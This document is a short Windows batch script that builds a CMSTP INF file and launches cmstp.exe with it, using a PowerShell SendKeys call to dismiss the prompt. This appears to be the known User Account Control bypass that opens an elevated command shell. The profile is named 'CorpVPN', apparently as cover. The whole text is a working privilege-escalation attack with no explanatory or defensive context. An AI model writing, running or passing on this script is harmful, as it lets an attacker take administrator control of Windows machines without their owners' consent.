@echo off
set StartFile=C:\Windows\System32\cmd.exe
set InfFile=%temp%\CMSTP.inf
set CmstpFile=c:\windows\system32\cmstp.exe
set ServiceName=CorpVPN
(
echo [version]
echo Signature=$chicago$
echo AdvancedINF=2.5
echo [DefaultInstall]
echo CustomDestination=CustInstDestSectionAllUsers
echo RunPreSetupCommands=RunPreSetupCommandsSection
echo [RunPreSetupCommandsSection]
echo ; Commands Here will be run Before Setup Begins to install
echo %StartFile%
echo taskkill /IM cmstp.exe /F
echo [CustInstDestSectionAllUsers]
echo 49000,49001=AllUSer_LDIDSection, 7
echo [AllUSer_LDIDSection]
echo "HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%%UnexpectedError%%", ""
echo [Strings]
echo ServiceName="%ServiceName%"
echo ShortSvcName="%ServiceName%"
) > "%InfFile%"
start %CmstpFile% /ni /au %InfFile%
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')"
exit